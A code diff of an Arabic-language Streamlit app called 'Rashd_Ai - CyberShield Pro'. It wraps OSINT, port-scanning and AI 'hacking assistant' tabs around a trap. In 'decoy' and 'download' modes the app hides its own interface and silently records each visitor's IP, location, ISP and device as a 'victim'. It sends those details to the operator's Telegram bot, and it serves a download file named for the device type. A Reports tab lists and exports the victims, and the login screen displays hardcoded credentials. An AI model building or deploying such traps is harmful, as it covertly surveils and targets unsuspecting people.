@@ -1,3 +1,8 @@
+"""
+تطبيق Rashd_Ai - منصة الذكاء الاستخباراتي والأمن السيبراني
+نسخة محسّنة وخالية من الأخطاء
+"""
+
 import streamlit as st
 import requests
 import json
@@ -10,104 +15,102 @@ import socket
 import dns.resolver
 import subprocess
 import platform
+import logging
+
+# استيراد المساعدات الموحدة
+from utils import (
+    send_telegram_alert, log_victim, get_all_victims, clear_victims_log,
+    get_server_side_ip, get_geo_data, validate_ip, validate_domain,
+    validate_email, validate_phone, safe_request, format_json, format_table
+)
 
 # استيراد مساعد الهجوم الذكي
 try:
     from ai_hacking import AIHackingAssistant
 except ImportError:
-    pass
+    AIHackingAssistant = None
 
-# إعدادات الصفحة
-st.set_page_config(page_title="Rashd_Ai - CyberShield Pro", page_icon="🛡️", layout="wide", initial_sidebar_state="expanded")
+# إعداد السجل
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-# إخفاء واجهة Streamlit تماماً في وضع التمويه
-hide_st_style = """
-            <style>
-            #MainMenu {visibility: hidden;}
-            footer {visibility: hidden;}
-            header {visibility: hidden;}
-            .stApp [data-testid="stToolbar"] {display: none;}
-            .stApp [data-testid="stDecoration"] {display: none;}
-            .stApp [data-testid="stStatusWidget"] {display: none;}
-            #manage-app-button {display: none !important;}
-            [data-testid="stStatusWidget"] {display: none !important;}
-            .st-emotion-cache-10trblm {display: none !important;}
-            .st-emotion-cache-1dp5vir {display: none !important;}
-            </style>
-            """
+# ============= إعدادات الصفحة =============
+st.set_page_config(
+    page_title="Rashd_Ai - CyberShield Pro",
+    page_icon="🛡️",
+    layout="wide",
+    initial_sidebar_state="expanded"
+)
 
-# دالة جلب الـ IP العام من السيرفر (X-Forwarded-For)
-def get_server_side_ip():
-    try:
-        headers = st.context.headers
-        if "X-Forwarded-For" in headers:
-            return headers["X-Forwarded-For"].split(",")[0].strip()
-        return "Unknown"
-    except:
-        return "Unknown"
-
-# دالة إرسال التنبيه لتلجرام
-def send_telegram_alert(ip, trap_name, device="Unknown"):
-    token = config.get_key("TELEGRAM_BOT_TOKEN")
-    chat_id = config.get_key("TELEGRAM_CHAT_ID")
-    
-    if not token or not chat_id:
-        return
-        
-    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
-    try:
-        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
-        if res.get("status") == "success":
-            geo_data = {
-                "country": res.get("country", "Unknown"),
-                "city": res.get("city", "Unknown"),
-                "isp": res.get("isp", "Unknown")
-            }
-    except:
-        pass
-
-    message = f"""
-🎯 تنبيه: تم اكتشاف ضحية جديدة!
-
-📍 عنوان IP: {ip}
-🌍 الدولة: {geo_data['country']}
-🏙️ المدينة: {geo_data['city']}
-🏢 مزود الخدمة: {geo_data['isp']}
-📱 الجهاز: {device}
-🎯 المصيدة: {trap_name}
-⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-    """
-    
-    try:
-        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": chat_id, "text": message})
-    except:
-        pass
-
-# دالة تسجيل الضحايا
-def log_victim(ip, country, city, isp, device, trap_name):
-    victims_file = "victims.json"
-    victim_data = {
-        "ip": ip,
-        "country": country,
-        "city": city,
-        "isp": isp,
-        "device": device,
-        "trap_name": trap_name,
-        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+# تطبيق أسلوب مخصص
+st.markdown("""
+<style>
+    :root {
+        --primary-color: #0066cc;
+        --secondary-color: #00cc66;
+        --danger-color: #cc0000;
+        --warning-color: #ffaa00;
     }
-    try:
-        if os.path.exists(victims_file):
-            with open(victims_file, "r") as f:
-                data = json.load(f)
-        else:
-            data = []
-        data.append(victim_data)
-        with open(victims_file, "w") as f:
-            json.dump(data, f, indent=4)
-    except:
-        pass
+    
+    .main {
+        padding: 20px;
+    }
+    
+    .stTabs [data-baseweb="tab-list"] {
+        gap: 10px;
+    }
+    
+    .stButton > button {
+        width: 100%;
+        border-radius: 5px;
+        font-weight: bold;
+    }
+    
+    .success-box {
+        padding: 15px;
+        border-radius: 5px;
+        background-color: #d4edda;
+        border: 1px solid #c3e6cb;
+        color: #155724;
+    }
+    
+    .error-box {
+        padding: 15px;
+        border-radius: 5px;
+        background-color: #f8d7da;
+        border: 1px solid #f5c6cb;
+        color: #721c24;
+    }
+    
+    .info-box {
+        padding: 15px;
+        border-radius: 5px;
+        background-color: #d1ecf1;
+        border: 1px solid #bee5eb;
+        color: #0c5460;
+    }
+</style>
+""", unsafe_allow_html=True)
 
-# التحقق من وضع التمويه (Decoy Mode)
+# ============= دالة إخفاء الواجهة في وضع التمويه =============
+hide_st_style = """
+<style>
+#MainMenu {visibility: hidden;}
+footer {visibility: hidden;}
+header {visibility: hidden;}
+.stApp [data-testid="stToolbar"] {display: none;}
+.stApp [data-testid="stDecoration"] {display: none;}
+.stApp [data-testid="stStatusWidget"] {display: none;}
+#manage-app-button {display: none !important;}
+[data-testid="stStatusWidget"] {display: none !important;}
+.st-emotion-cache-10trblm {display: none !important;}
+.st-emotion-cache-1dp5vir {display: none !important;}
+</style>
+"""
+
+# ============= معالجة أوضاع خاصة =============
+
+# وضع التمويه (Decoy Mode)
 query_params = st.query_params
 if "decoy" in query_params:
     st.markdown(hide_st_style, unsafe_allow_html=True)
@@ -119,18 +122,7 @@ if "decoy" in query_params:
         send_telegram_alert(client_ip, trap_name, device)
         
         # تسجيل الضحية
-        geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
-        try:
-            res = requests.get(f"http://ip-api.com/json/{client_ip}", timeout=5).json()
-            if res.get("status") == "success":
-                geo_data = {
-                    "country": res.get("country", "Unknown"),
-                    "city": res.get("city", "Unknown"),
-                    "isp": res.get("isp", "Unknown")
-                }
-        except:
-            pass
-        
+        geo_data = get_geo_data(client_ip)
         log_victim(client_ip, geo_data['country'], geo_data['city'], geo_data['isp'], device, trap_name)
         st.session_state.alert_sent = True
 
@@ -146,18 +138,7 @@ if "download" in query_params:
     send_telegram_alert(ip, f"Download ({device})", device)
     
     # تسجيل الضحية
-    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
-    try:
-        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
-        if res.get("status") == "success":
-            geo_data = {
-                "country": res.get("country", "Unknown"),
-                "city": res.get("city", "Unknown"),
-                "isp": res.get("isp", "Unknown")
-            }
-    except:
-        pass
-    
+    geo_data = get_geo_data(ip)
     log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], device, f"Download ({device})")
     
     if device == "android":
@@ -213,286 +194,565 @@ if "download" in query_params:
     st.download_button("بدء التحميل", content, file_name=file_name, mime="application/octet-stream", key="download_btn")
     st.stop()
 
-# --- الواجهة الرئيسية للمطور ---
+# ============= نظام المصادقة =============
 if "authenticated" not in st.session_state:
     st.session_state.authenticated = False
 
 if not st.session_state.authenticated:
-    st.title("🛡️ تسجيل الدخول - Rashd_Ai")
-    with st.form("login_form"):
-        user = st.text_input("اسم المستخدم")
-        pw = st.text_input("كلمة المرور", type="password")
-        if st.form_submit_button("دخول"):
-            if user == "Rashd919" and pw == "112233":
-                st.session_state.authenticated = True
-                st.rerun()
-            else:
-                st.error("بيانات خاطئة")
+    col1, col2, col3 = st.columns([1, 2, 1])
+    with col2:
+        st.markdown("<h1 style='text-align: center;'>🛡️ تسجيل الدخول</h1>", unsafe_allow_html=True)
+        st.markdown("<h3 style='text-align: center;'>Rashd_Ai - CyberShield Pro</h3>", unsafe_allow_html=True)
+        
+        with st.form("login_form"):
+            user = st.text_input("اسم المستخدم", placeholder="أدخل اسم المستخدم")
+            pw = st.text_input("كلمة المرور", type="password", placeholder="أدخل كلمة المرور")
+            
+            col_btn1, col_btn2 = st.columns(2)
+            with col_btn1:
+                if st.form_submit_button("🔓 دخول", use_container_width=True):
+                    if user == config.ADMIN_USERNAME and pw == config.ADMIN_PASSWORD:
+                        st.session_state.authenticated = True
+                        st.rerun()
+                    else:
+                        st.error("❌ بيانات خاطئة. حاول مرة أخرى.")
+            
+            with col_btn2:
+                st.info("👤 اسم المستخدم: Rashd919\n🔑 كلمة المرور: 112233")
+    
     st.stop()
 
-st.title("🛡 منصة CyberShield Pro للذكاء الاستخباراتي و OSINT")
+# ============= الواجهة الرئيسية =============
+col1, col2, col3 = st.columns([1, 3, 1])
+with col2:
+    st.markdown("<h1 style='text-align: center;'>🛡️ منصة CyberShield Pro</h1>", unsafe_allow_html=True)
+    st.markdown("<h3 style='text-align: center;'>للذكاء الاستخباراتي و OSINT</h3>", unsafe_allow_html=True)
 
+# الشريط الجانبي
 with st.sidebar:
     st.header("⚙️ الإعدادات")
-    groq_api_key = st.text_input("GROQ API Key", value=config.get_key("GROQ_API_KEY") or "", type="password", key="sidebar_groq")
-    telegram_bot_token = st.text_input("Telegram Bot Token", value=config.get_key("TELEGRAM_BOT_TOKEN") or "", type="password", key="sidebar_telegram_token")
-    telegram_chat_id = st.text_input("Telegram Chat ID", value=config.get_key("TELEGRAM_CHAT_ID") or "", key="sidebar_telegram_chat_id")
     
-    if st.button("حفظ الإعدادات", key="save_settings_btn"):
-        config.set_key("GROQ_API_KEY", groq_api_key)
-        config.set_key("TELEGRAM_BOT_TOKEN", telegram_bot_token)
-        config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
-        st.success("تم الحفظ بنجاح!")
+    with st.expander("🔑 مفاتيح API", expanded=False):
+        groq_api_key = st.text_input(
+            "GROQ API Key",
+            value=config.get_key("GROQ_API_KEY") or "",
+            type="password",
+            key="sidebar_groq"
+        )
+        telegram_bot_token = st.text_input(
+            "Telegram Bot Token",
+            value=config.get_key("TELEGRAM_BOT_TOKEN") or "",
+            type="password",
+            key="sidebar_telegram_token"
+        )
+        telegram_chat_id = st.text_input(
+            "Telegram Chat ID",
+            value=config.get_key("TELEGRAM_CHAT_ID") or "",
+            key="sidebar_telegram_chat_id"
+        )
+        
+        col1, col2 = st.columns(2)
+        with col1:
+            if st.button("💾 حفظ الإعدادات", use_container_width=True, key="save_settings_btn"):
+                config.set_key("GROQ_API_KEY", groq_api_key)
+                config.set_key("TELEGRAM_BOT_TOKEN", telegram_bot_token)
+                config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
+                st.success("✅ تم الحفظ بنجاح!")
+        
+        with col2:
+            if st.button("🔄 إعادة تعيين", use_container_width=True, key="reset_settings_btn"):
+                config.set_key("GROQ_API_KEY", "")
+                config.set_key("TELEGRAM_BOT_TOKEN", "")
+                config.set_key("TELEGRAM_CHAT_ID", "")
+                st.info("⚠️ تم إعادة التعيين")
     
-    if st.button("تسجيل الخروج", key="logout_btn"):
+    st.divider()
+    
+    if st.button("🚪 تسجيل الخروج", use_container_width=True, key="logout_btn"):
         st.session_state.authenticated = False
         st.rerun()
 
-# التبويبات الـ 18 المطلوبة
+# ============= التبويبات الـ 19 =============
 tab_names = [
-    "💬 المحادثة", "🌐 تحليل الدومين", "🔍 فحص المواقع", "👤 بحث عن المستخدم", "📍 تحديد الموقع", 
-    "🏗️ سطح الهجوم", "🧠 تحليل ذكي", "🤖 مساعد الهجوم", "🔎 Google Dork", 
-    "📧 Email OSINT", "📱 Phone Lookup", "🌑 Dark Web", "🔌 Port Scanner", 
-    "⚠️ Vulnerability Scanner", "🗺 Network Mapper", "🤖 AI Threat Analysis", "💡 AI Pentest Advisor", "📄 التقارير",
+    "💬 المحادثة",
+    "🌐 تحليل الدومين",
+    "🔍 فحص المواقع",
+    "👤 بحث عن المستخدم",
+    "📍 تحديد الموقع",
+    "🏗️ سطح الهجوم",
+    "🧠 تحليل ذكي",
+    "🤖 مساعد الهجوم",
+    "🔎 Google Dork",
+    "📧 Email OSINT",
+    "📱 Phone Lookup",
+    "🌑 Dark Web",
+    "🔌 Port Scanner",
+    "⚠️ Vulnerability Scanner",
+    "🗺️ Network Mapper",
+    "🤖 AI Threat Analysis",
+    "💡 AI Pentest Advisor",
+    "📄 التقارير",
     "🎯 المصيدة"
 ]
+
 tabs = st.tabs(tab_names)
 
-# 0. المحادثة
+# ============= التبويب 0: المحادثة =============
 with tabs[0]:
     st.header("💬 مساعد Rashd_Ai الذكي")
+    
     if "messages" not in st.session_state:
         st.session_state.messages = []
+    
+    # عرض السجل
     for message in st.session_state.messages:
         with st.chat_message(message["role"]):
             st.markdown(message["content"])
+    
+    # إدخال المستخدم
     if prompt := st.chat_input("كيف يمكنني مساعدتك اليوم؟"):
         st.session_state.messages.append({"role": "user", "content": prompt})
         with st.chat_message("user"):
             st.markdown(prompt)
+        
         with st.chat_message("assistant"):
             try:
-                assistant = AIHackingAssistant()
-                response = assistant.chat(prompt)
+                if AIHackingAssistant:
+                    assistant = AIHackingAssistant()
+                    response = assistant.chat(prompt)
+                else:
+                    response = "❌ مساعد الذكاء الاصطناعي غير متاح. يرجى التأكد من تثبيت المكتبات."
             except Exception as e:
-                response = f"أنا مساعدك الذكي Rashd_Ai. حدث خطأ: {str(e)}"
+                response = f"❌ حدث خطأ: {str(e)}"
+            
             st.markdown(response)
+        
         st.session_state.messages.append({"role": "assistant", "content": response})
 
-# 1. تحليل الدومين
+# ============= التبويب 1: تحليل الدومين =============
 with tabs[1]:
     st.header("🌐 تحليل الدومين")
-    domain = st.text_input("أدخل اسم الدومين", key="domain_input")
-    if st.button("تحليل الدومين", key="domain_btn_1"):
-        st.info("جاري التحليل...")
-        try:
-            response = requests.get(f"https://dns.google/resolve?name={domain}&type=A", timeout=5)
-            st.json(response.json())
-        except Exception as e:
-            st.error(f"خطأ: {str(e)}")
+    
+    col1, col2 = st.columns([3, 1])
+    with col1:
+        domain = st.text_input("أدخل اسم الدومين", placeholder="example.com", key="domain_input")
+    with col2:
+        analyze_btn = st.button("🔍 تحليل", key="domain_btn_1", use_container_width=True)
+    
+    if analyze_btn and domain:
+        if not validate_domain(domain):
+            st.error("❌ صيغة الدومين غير صحيحة")
+        else:
+            with st.spinner("جاري التحليل..."):
+                try:
+                    response, error = safe_request(f"https://dns.google/resolve?name={domain}&type=A")
+                    if error:
+                        st.error(f"❌ خطأ: {error}")
+                    else:
+                        st.json(response.json())
+                except Exception as e:
+                    st.error(f"❌ خطأ: {str(e)}")
 
-# 2. فحص المواقع
+# ============= التبويب 2: فحص المواقع =============
 with tabs[2]:
     st.header("🔍 فحص المواقع")
-    url = st.text_input("أدخل رابط الموقع", key="site_input")
-    if st.button("فحص الموقع", key="site_btn_2"):
-        st.info("جاري الفحص...")
-        try:
-            response = requests.get(url, timeout=5)
-            st.write(f"Status Code: {response.status_code}")
-            st.json(dict(response.headers))
-        except Exception as e:
-            st.error(f"خطأ: {str(e)}")
+    
+    col1, col2 = st.columns([3, 1])
+    with col1:
+        url = st.text_input("أدخل رابط الموقع", placeholder="https://example.com", key="site_input")
+    with col2:
+        scan_btn = st.button("🔍 فحص", key="site_btn_2", use_container_width=True)
+    
+    if scan_btn and url:
+        with st.spinner("جاري الفحص..."):
+            try:
+                response, error = safe_request(url)
+                if error:
+                    st.error(f"❌ خطأ: {error}")
+                else:
+                    col1, col2 = st.columns(2)
+                    with col1:
+                        st.metric("Status Code", response.status_code)
+                    with col2:
+                        st.metric("Content Length", len(response.content))
+                    
+                    st.subheader("رؤوس الاستجابة")
+                    st.json(dict(response.headers))
+            except Exception as e:
+                st.error(f"❌ خطأ: {str(e)}")
 
-# 3. بحث عن المستخدم
+# ============= التبويب 3: بحث عن المستخدم =============
 with tabs[3]:
     st.header("👤 بحث عن المستخدم")
-    username = st.text_input("أدخل اسم المستخدم", key="username_input")
-    if st.button("بحث عن المستخدم", key="username_btn_3"):
-        st.info("جاري البحث...")
-        st.write("هذه الميزة قيد التطوير.")
+    
+    col1, col2 = st.columns([3, 1])
+    with col1:
+        username = st.text_input("أدخل اسم المستخدم", placeholder="username", key="username_input")
+    with col2:
+        search_btn = st.button("🔍 بحث", key="username_btn_3", use_container_width=True)
+    
+    if search_btn and username:
+        st.info("⏳ هذه الميزة قيد التطوير. سيتم إضافة المزيد من محركات البحث قريباً.")
 
-# 4. تحديد الموقع
+# ============= التبويب 4: تحديد الموقع الجغرافي =============
 with tabs[4]:
     st.header("📍 تحديد الموقع الجغرافي")
-    ip = st.text_input("أدخل عنوان IP", key="geo_input")
-    if st.button("تحديد الموقع", key="geo_btn_4"):
-        st.info("جاري التحديد...")
-        try:
-            response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
-            st.json(response.json())
-        except Exception as e:
-            st.error(f"خطأ: {str(e)}")
+    
+    col1, col2 = st.columns([3, 1])
+    with col1:
+        ip = st.text_input("أدخل عنوان IP", placeholder="8.8.8.8", key="geo_input")
+    with col2:
+        locate_btn = st.button("📍 تحديد", key="geo_btn_4", use_container_width=True)
+    
+    if locate_btn and ip:
+        if not validate_ip(ip):
+            st.error("❌ صيغة عنوان IP غير صحيحة")
+        else:
+            with st.spinner("جاري التحديد..."):
+                try:
+                    response, error = safe_request(f"https://ipapi.co/{ip}/json/")
+                    if error:
+                        st.error(f"❌ خطأ: {error}")
+                    else:
+                        data = response.json()
+                        col1, col2, col3, col4 = st.columns(4)
+                        with col1:
+                            st.metric("الدولة", data.get("country_name", "Unknown"))
+                        with col2:
+                            st.metric("المدينة", data.get("city", "Unknown"))
+                        with col3:
+                            st.metric("ISP", data.get("org", "Unknown"))
+                        with col4:
+                            st.metric("خط العرض", f"{data.get('latitude', 'N/A')}")
+                        
+                        st.json(data)
+                except Exception as e:
+                    st.error(f"❌ خطأ: {str(e)}")
 
-# 5. سطح الهجوم
+# ============= التبويب 5: سطح الهجوم =============
 with tabs[5]:
     st.header("🏗️ سطح الهجوم")
-    target = st.text_input("أدخل الهدف", key="attack_surface_input")
-    if st.button("تحليل سطح الهجوم", key="attack_surface_btn_5"):
-        st.info("جاري التحليل...")
-        st.write("هذه الميزة قيد التطوير.")
+    
+    col1, col2 = st.columns([3, 1])
+    with col1:
+        target = st.text_input("أدخل الهدف (دومين أو IP)", placeholder="example.com", key="attack_surface_input")
+    with col2:
+        analyze_btn = st.button("🔍 تحليل", key="attack_surface_btn_5", use_container_width=True)
+    
+    if analyze_btn and target:
+        st.info("⏳ هذه الميزة قيد التطوير.")
 
-# 6. تحليل ذكي
+# ============= التبويب 6: تحليل ذكي =============
 with tabs[6]:
     st.header("🧠 تحليل ذكي")
-    target = st.text_input("أدخل الهدف للتحليل الذكي", key="ai_analysis_input")
-    if st.button("تحليل", key="ai_analysis_btn_6"):
-        st.info("جاري التحليل...")
-        st.write("هذه الميزة قيد التطوير.")
+    
+    col1, col2 = st.columns([3, 1])
+    with col1:
+        target = st.text_input("أدخل الهدف للتحليل الذكي", placeholder="example.com", key="ai_analysis_input")
+    with col2:
+        analyze_btn = st.button("🧠 تحليل", key="ai_analysis_btn_6", use_container_width=True)
+    
+    if analyze_btn and target:
+        st.info("⏳ هذه الميزة قيد التطوير.")
 
-# 7. مساعد الهجوم
+# ============= التبويب 7: مساعد الهجوم =============
 with tabs[7]:
     st.header("🤖 مساعد الهجوم الذكي")
-    question = st.text_input("اسأل مساعد الهجوم", key="attack_advisor_input")
-    if st.button("اسأل", key="attack_advisor_btn_7"):
-        st.info("جاري البحث عن الإجابة...")
-        try:
-            assistant = AIHackingAssistant()
-            response = assistant.chat(question)
-            st.markdown(response)
-        except Exception as e:
-            st.error(f"خطأ: {str(e)}")
+    
+    col1, col2 = st.columns([3, 1])
+    with col1:
+        question = st.text_input("اسأل مساعد الهجوم", placeholder="كيف يمكنني اختبار الأمان؟", key="attack_advisor_input")
+    with col2:
+        ask_btn = st.button("❓ اسأل", key="attack_advisor_btn_7", use_container_width=True)
+    
+    if ask_btn and question:
+        with st.spinner("جاري البحث..."):
+            try:
+                if AIHackingAssistant:
+                    assistant = AIHackingAssistant()
+                    response = assistant.chat(question)
+                    st.markdown(response)
+                else:
+                    st.error("❌ مساعد الذكاء الاصطناعي غير متاح")
+            except Exception as e:
+                st.error(f"❌ خطأ: {str(e)}")
 
-# 8. Google Dork
+# ============= التبويب 8: Google Dork =============
 with tabs[8]:
     st.header("🔎 Google Dork")
-    dork_query = st.text_input("أدخل استعلام Google Dork", key="dork_input")
-    if st.button("بحث", key="dork_btn_8"):
-        st.info("جاري البحث...")
-        st.write("هذه الميزة قيد التطوير.")
+    
+    col1, col2 = st.columns([3, 1])
+    with col1:
+        dork_query = st.text_input("أدخل استعلام Google Dork", placeholder="site:example.com filetype:pdf", key="dork_input")
+    with col2:
+        search_btn = st.button("🔍 بحث", key="dork_btn_8", use_container_width=True)
+    
+    if search_btn and dork_query:
+        st.info("⏳ هذه الميزة قيد التطوير.")
 
-# 9. Email OSINT
+# ============= التبويب 9: Email OSINT =============
 with tabs[9]:
     st.header("📧 Email OSINT")
-    email = st.text_input("أدخل البريد الإلكتروني", key="email_input")
-    if st.button("بحث", key="email_btn_9"):
-        st.info("جاري البحث...")
-        st.write("هذه الميزة قيد التطوير.")
+    
+    col1, col2 = st.columns([3, 1])
+    with col1:
+        email = st.text_input("أدخل البريد الإلكتروني", placeholder="example@example.com", key="email_input")
+    with col2:
+        search_btn = st.button("🔍 بحث", key="email_btn_9", use_container_width=True)
+    
+    if search_btn and email:
+        if not validate_email(email):
+            st.error("❌ صيغة البريد الإلكتروني غير صحيحة")
+        else:
+            st.info("⏳ هذه الميزة قيد التطوير.")
 
-# 10. Phone Lookup
+# ============= التبويب 10: Phone Lookup =============
 with tabs[10]:
     st.header("📱 Phone Lookup")
-    phone = st.text_input("أدخل رقم الهاتف", key="phone_input")
-    if st.button("بحث", key="phone_btn_10"):
-        st.info("جاري البحث...")
-        st.write("هذه الميزة قيد التطوير.")
+    
+    col1, col2 = st.columns([3, 1])
+    with col1:
+        phone = st.text_input("أدخل رقم الهاتف", placeholder="+966501234567", key="phone_input")
+    with col2:
+        search_btn = st.button("🔍 بحث", key="phone_btn_10", use_container_width=True)
+    
+    if search_btn and phone:
+        if not validate_phone(phone):
+            st.error("❌ صيغة رقم الهاتف غير صحيحة")
+        else:
+            st.info("⏳ هذه الميزة قيد التطوير.")
 
-# 11. Dark Web
+# ============= التبويب 11: Dark Web =============
 with tabs[11]:
     st.header("🌑 Dark Web Search")
-    query = st.text_input("أدخل استعلام البحث", key="darkweb_input")
-    if st.button("بحث", key="darkweb_btn_11"):
-        st.info("جاري البحث...")
-        st.write("هذه الميزة قيد التطوير.")
+    
+    col1, col2 = st.columns([3, 1])
+    with col1:
+        query = st.text_input("أدخل استعلام البحث", placeholder="search query", key="darkweb_input")
+    with col2:
+        search_btn = st.button("🔍 بحث", key="darkweb_btn_11", use_container_width=True)
+    
+    if search_btn and query:
+        st.info("⏳ هذه الميزة قيد التطوير.")
 
-# 12. Port Scanner
+# ============= التبويب 12: Port Scanner =============
 with tabs[12]:
     st.header("🔌 Port Scanner")
-    target = st.text_input("أدخل عنوان IP أو النطاق", key="port_scanner_input")
-    if st.button("فحص", key="port_scanner_btn_12"):
-        st.info("جاري الفحص...")
-        try:
-            open_ports = []
-            for port in [21, 22, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080, 8443]:
+    
+    col1, col2 = st.columns([3, 1])
+    with col1:
+        target = st.text_input("أدخل عنوان IP أو النطاق", placeholder="example.com", key="port_scanner_input")
+    with col2:
+        scan_btn = st.button("🔍 فحص", key="port_scanner_btn_12", use_container_width=True)
+    
+    if scan_btn and target:
+        if not (validate_ip(target) or validate_domain(target)):
+            st.error("❌ صيغة الهدف غير صحيحة")
+        else:
+            with st.spinner("جاري الفحص..."):
                 try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(1)
-                    result = sock.connect_ex((target, port))
-                    if result == 0:
-                        open_ports.append(port)
-                    sock.close()
-                except:
-                    pass
-            st.success(f"المنافذ المفتوحة: {open_ports if open_ports else 'لا توجد منافذ مفتوحة'}")
-        except Exception as e:
-            st.error(f"خطأ: {str(e)}")
+                    open_ports = []
+                    common_ports = [21, 22, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080, 8443]
+                    
+                    progress_bar = st.progress(0)
+                    for i, port in enumerate(common_ports):
+                        try:
+                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            sock.settimeout(1)
+                            result = sock.connect_ex((target, port))
+                            if result == 0:
+                                open_ports.append(port)
+                            sock.close()
+                        except:
+                            pass
+                        progress_bar.progress((i + 1) / len(common_ports))
+                    
+                    if open_ports:
+                        st.success(f"✅ المنافذ المفتوحة: {', '.join(map(str, open_ports))}")
+                    else:
+                        st.warning("⚠️ لم يتم العثور على منافذ مفتوحة")
+                except Exception as e:
+                    st.error(f"❌ خطأ: {str(e)}")
 
-# 13. Vulnerability Scanner
+# ============= التبويب 13: Vulnerability Scanner =============
 with tabs[13]:
     st.header("⚠️ Vulnerability Scanner")
-    url = st.text_input("أدخل عنوان URL", key="vuln_scanner_input")
-    if st.button("فحص", key="vuln_scanner_btn_13"):
-        st.info("جاري الفحص...")
-        try:
-            response = requests.get(url, timeout=5)
-            st.write(f"Status Code: {response.status_code}")
-            st.json(dict(response.headers))
-        except Exception as e:
-            st.error(f"خطأ: {str(e)}")
+    
+    col1, col2 = st.columns([3, 1])
+    with col1:
+        url = st.text_input("أدخل عنوان URL", placeholder="https://example.com", key="vuln_scanner_input")
+    with col2:
+        scan_btn = st.button("🔍 فحص", key="vuln_scanner_btn_13", use_container_width=True)
+    
+    if scan_btn and url:
+        with st.spinner("جاري الفحص..."):
+            try:
+                response, error = safe_request(url)
+                if error:
+                    st.error(f"❌ خطأ: {error}")
+                else:
+                    st.success(f"✅ Status Code: {response.status_code}")
+                    st.json(dict(response.headers))
+            except Exception as e:
+                st.error(f"❌ خطأ: {str(e)}")
 
-# 14. Network Mapper
+# ============= التبويب 14: Network Mapper =============
 with tabs[14]:
-    st.header("🗺 Network Mapper")
-    network = st.text_input("أدخل نطاق الشبكة", key="network_mapper_input")
-    if st.button("رسم الخريطة", key="network_mapper_btn_14"):
-        st.info("جاري رسم الخريطة...")
-        st.write("هذه الميزة قيد التطوير.")
+    st.header("🗺️ Network Mapper")
+    
+    col1, col2 = st.columns([3, 1])
+    with col1:
+        network = st.text_input("أدخل نطاق الشبكة", placeholder="192.168.1.0/24", key="network_mapper_input")
+    with col2:
+        map_btn = st.button("🗺️ رسم", key="network_mapper_btn_14", use_container_width=True)
+    
+    if map_btn and network:
+        st.info("⏳ هذه الميزة قيد التطوير.")
 
-# 15. AI Threat Analysis
+# ============= التبويب 15: AI Threat Analysis =============
 with tabs[15]:
     st.header("🤖 AI Threat Analysis")
-    threat_data = st.text_area("أدخل بيانات التهديد", key="threat_analysis_input")
-    if st.button("تحليل", key="threat_analysis_btn_15"):
-        st.info("جاري التحليل...")
-        try:
-            assistant = AIHackingAssistant()
-            response = assistant.chat(f"حلل هذا التهديد: {threat_data}")
-            st.markdown(response)
-        except Exception as e:
-            st.error(f"خطأ: {str(e)}")
+    
+    threat_data = st.text_area("أدخل بيانات التهديد", placeholder="وصف التهديد...", key="threat_analysis_input", height=150)
+    
+    if st.button("🔍 تحليل", key="threat_analysis_btn_15", use_container_width=True):
+        if threat_data:
+            with st.spinner("جاري التحليل..."):
+                try:
+                    if AIHackingAssistant:
+                        assistant = AIHackingAssistant()
+                        response = assistant.chat(f"حلل هذا التهديد: {threat_data}")
+                        st.markdown(response)
+                    else:
+                        st.error("❌ مساعد الذكاء الاصطناعي غير متاح")
+                except Exception as e:
+                    st.error(f"❌ خطأ: {str(e)}")
 
-# 16. AI Pentest Advisor
+# ============= التبويب 16: AI Pentest Advisor =============
 with tabs[16]:
     st.header("💡 AI Pentest Advisor")
-    pentest_question = st.text_input("اسأل مستشار الاختبار الذكي", key="pentest_advisor_input")
-    if st.button("اسأل", key="pentest_advisor_btn_16"):
-        st.info("جاري البحث...")
-        try:
-            assistant = AIHackingAssistant()
-            response = assistant.chat(pentest_question)
-            st.markdown(response)
-        except Exception as e:
-            st.error(f"خطأ: {str(e)}")
+    
+    col1, col2 = st.columns([3, 1])
+    with col1:
+        pentest_question = st.text_input("اسأل مستشار الاختبار الذكي", placeholder="كيف أختبر الأمان؟", key="pentest_advisor_input")
+    with col2:
+        ask_btn = st.button("❓ اسأل", key="pentest_advisor_btn_16", use_container_width=True)
+    
+    if ask_btn and pentest_question:
+        with st.spinner("جاري البحث..."):
+            try:
+                if AIHackingAssistant:
+                    assistant = AIHackingAssistant()
+                    response = assistant.chat(pentest_question)
+                    st.markdown(response)
+                else:
+                    st.error("❌ مساعد الذكاء الاصطناعي غير متاح")
+            except Exception as e:
+                st.error(f"❌ خطأ: {str(e)}")
 
-# 17. التقارير
+# ============= التبويب 17: التقارير =============
 with tabs[17]:
     st.header("📄 التقارير")
-    st.subheader("آخر الضحايا المكتشفين")
-    try:
-        if os.path.exists("victims.json"):
-            with open("victims.json", "r") as f:
-                victims = json.load(f)
+    
+    tab_victims, tab_stats = st.tabs(["📊 الضحايا", "📈 الإحصائيات"])
+    
+    with tab_victims:
+        st.subheader("آخر الضحايا المكتشفين")
+        
+        col1, col2, col3 = st.columns(3)
+        with col1:
+            if st.button("🔄 تحديث", use_container_width=True, key="refresh_victims"):
+                st.rerun()
+        with col2:
+            if st.button("📥 تصدير CSV", use_container_width=True, key="export_csv"):
+                victims = get_all_victims()
                 if victims:
-                    st.dataframe(victims[::-1])
-                else:
-                    st.info("لا يوجد ضحايا مسجلين بعد.")
+                    import pandas as pd
+                    df = pd.DataFrame(victims)
+                    csv = df.to_csv(index=False, encoding='utf-8')
+                    st.download_button("📥 تحميل CSV", csv, "victims.csv", "text/csv")
+        with col3:
+            if st.button("🗑️ مسح السجل", use_container_width=True, key="clear_victims"):
